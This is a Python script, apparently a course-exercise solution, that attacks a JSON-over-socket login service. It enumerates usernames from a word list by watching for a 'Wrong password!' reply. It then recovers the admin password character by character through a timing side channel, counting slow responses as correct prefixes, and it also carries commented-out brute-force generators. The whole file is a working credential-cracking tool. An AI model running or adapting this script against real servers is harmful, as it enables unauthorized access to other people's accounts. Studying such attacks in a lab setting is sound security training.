import socket, string, sys, itertools, json, datetime


def brute_force_gen():
    """Yields combinations of passwords based on latin letters and numbers"""
    chars = string.ascii_letters + string.digits
    tries = 1
    length = 1
    while True:
        for key in itertools.combinations_with_replacement(chars, length):
            yield ''.join(key)
            tries += 1
        length += 1


def logins_gen():
    """Login generator object from a csv file"""
    with open('logins.csv', 'r') as text:
        login_list = text.read().split(',')
    for login in login_list:
        yield login


def passes_gen():
    """Password generator object from a csv file."""
    with open('passwords.csv', 'r') as text:
        pass_list = text.read().split(',')
    for word in pass_list:
        for password in map(''.join, itertools.product(*zip(word.upper(), word.lower()))):
            yield password


def to_json(username, password, indentation=None):
    """
    Converts two strings to json format
    :param username: potential username
    :param password: potential password
    :return: a json object
    """
    dct = {"login": username, "password": password}
    return json.dumps(dct, indent=indentation)


def run():
    """Run this function to start hacking a server by brute force."""
    try:
        # input target host:port from terminal
        script, host, port = sys.argv
    except ValueError:
        print('Try running the script from a terminal, for example:')
        print('python main.py localhost 9090')
        return
    port = int(port)
    buffer = 1024

    # establish connection
    with socket.socket() as client:
        client.connect((host, port))
        #for letter in brute_force_gen():  # use this to brute-force username
        for usr in logins_gen():  # first try usernames with empty pass
            client.send(to_json(usr, ' ', 4).encode())
            reply = json.loads(client.recv(buffer).decode())
            admin = usr
            if reply["result"] == "Wrong password!":  # knowing server vulnerability No1
                break

        psswrd = ''
        hacking = True
        while hacking:  # keep admin's username and try for password
            letter_gen = (letter for letter in (string.ascii_letters + string.digits))
            #for letter in brute_force_gen():  # use this to brute-force password
            for letter in letter_gen:
                before_reply = datetime.datetime.now()
                client.send(to_json(admin, psswrd + letter, 4).encode())
                reply = client.recv(buffer)
                after_reply = datetime.datetime.now()
                response = float(str(after_reply - before_reply).split(':')[-1])
                # create log for server response time, using datetime
                with open("./timing.txt", "a") as log:
                    log.write(f'{response}, {psswrd}\n\n')
                reply = json.loads(reply.decode())
                if response >= 0.07:  # time chosen after analyzing server's responses (timing.txt)
                    psswrd += letter
                    break
                elif reply["result"] == "Connection success!":  # knowing server vulnerability No2
                    hacking = False
                    psswrd += letter
                    print(to_json(admin, psswrd))
                    break
